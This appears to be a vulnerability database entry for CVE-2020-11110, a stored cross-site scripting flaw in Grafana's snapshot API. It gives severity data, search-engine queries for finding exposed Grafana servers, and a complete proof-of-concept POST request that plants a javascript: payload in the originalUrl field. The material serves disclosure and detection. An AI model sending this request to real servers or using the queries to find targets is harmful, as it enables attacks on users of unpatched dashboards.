---
layout: post
cve_id: CVE-2020-11110
title: Grafana <= 6.7.1 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2020/CVE-2020-11110.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-11110.yaml
snort2_rule: N/A
snort3_rule: N/A
author: emadshanab
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to potential data theft or unauthorized actions.

  '
remediation: This issue can be resolved by updating Grafana to the latest version.
reference:
- https://github.com/grafana/grafana/pull/23254
- https://security.netapp.com/advisory/ntap-20200810-0002/
- https://nvd.nist.gov/vuln/detail/CVE-2020-11110
- https://hackerone.com/reports/1329433
- https://github.com/grafana/grafana/blob/master/CHANGELOG.md
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 5.4
  cve-id: CVE-2020-11110
  cwe-id: CWE-79
  epss-score: 0.72691
  epss-percentile: 0.98723
  cpe: cpe:2.3:a:grafana:grafana:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: grafana
  product: grafana
  shodan-query:
  - title:"Grafana"
  - cpe:"cpe:2.3:a:grafana:grafana"
  - http.title:"grafana"
  fofa-query:
  - title="grafana"
  - app="grafana"
  google-query: intitle:"grafana"
tags:
- cve2020
- cve
- xss
- grafana
- hackerone
- vuln
---

## ðŸ” Vulnerability Description
Grafana through 6.7.1 contains an unauthenticated stored cross-site scripting vulnerability due to insufficient input protection in the originalUrl field, which allows an attacker to inject JavaScript code that will be executed after clicking on Open Original Dashboard after visiting the snapshot.

## ðŸŒ HTTP Request
```nohighlight
POST /api/snapshots HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Length: 739
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Connection: close
Referer: http://www.victim.com
content-type: application/json
Accept-Encoding: gzip

{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}
```

